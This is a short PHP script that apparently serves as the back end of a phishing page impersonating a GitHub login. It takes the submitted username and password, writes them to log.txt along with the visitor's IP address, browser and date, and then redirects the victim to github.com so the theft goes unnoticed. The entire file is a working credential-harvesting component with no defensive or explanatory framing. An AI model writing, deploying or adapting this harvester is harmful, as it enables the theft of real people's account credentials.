<?php

//writing the credentials to variables 
$un = $_POST["username"];
$pass = $_POST["password"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER[REMOTE_ADDR];
$line = date('Y-m-d');



$datafile= fopen("log.txt","a") or die("Error");
$txt = "\n \n USERNAME = $un\n PASSWORD = $pass\n Web Browser = $browser\n IP Address = $ip\n Date = $line\n";
fwrite($datafile,"\n". $txt);
fclose($datafile);

//redirecting to home page
header("Location: https://github.com");
exit();
?>